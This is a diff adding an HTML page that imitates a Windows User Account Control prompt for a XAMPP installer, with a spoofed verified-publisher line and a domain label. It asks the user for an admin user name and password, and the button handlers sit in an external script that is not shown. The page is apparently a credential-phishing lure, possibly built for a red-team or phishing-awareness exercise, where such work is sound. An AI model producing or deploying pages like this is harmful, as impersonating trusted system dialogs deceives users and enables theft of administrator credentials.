@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <link rel="stylesheet" href="StyleSheet.css">
+  <script src="https://code.jquery.com/jquery-3.6.1.js" integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI="
+    crossorigin="anonymous"></script>
+
+
+
+  <title></title>
+</head>
+
+<body>
+
+  <div id="MainParent">
+    <div id="TopRow">
+      <div id="MrMiyagi">
+        <div id="TopTitle"> User Account Control</div>
+        <div id="CloseBtn"> x </div>
+      </div>
+      <div id="SecondTopTitle">Do you want to allow this app to make changes to your device?</div>
+    </div>
+
+    <div id="BottomRow">
+      <div id="ApplicationNameParent">
+        <img id="ApplicationIcon" src="Media\Icon.png"></img>
+        <div id="ApplicationName">xampp-windows-x64-8.1.12-0-VS16-installer</div>
+      </div>
+
+      <div id="PublisherInfo">
+        Verified publisher: Open Source Developer, Beltran Rueda
+        File origin: Hard drive on this computer
+      </div>
+
+      <div id="DetailsTab"> Show more details </div>
+
+      <div id="InputFieldTitle"> To continue, enter an admin user name and password.</div>
+
+      <div id="InputParent">
+        <input class="InputField" type="text" id="UserName" placeholder="User name">
+        <br>
+        <input class="InputField" type="password" id="PW" placeholder="Password">
+      </div>
+
+      <div id="DomainText">Domain: GHL</div>
+
+      <div id="ParentbuttonDiv">
+
+        <button class="MyGreyButtons" type="button" onclick="BtnAction('yes')">Yes</button>
+        <button class="MyGreyButtons" type="button" onclick="BtnAction('No')">No</button>
+
+
+      </div>
+    </div>
+
+  </div>
+
+  <script src="MyScript.js"></script>
+
+</body>
+
+</html>
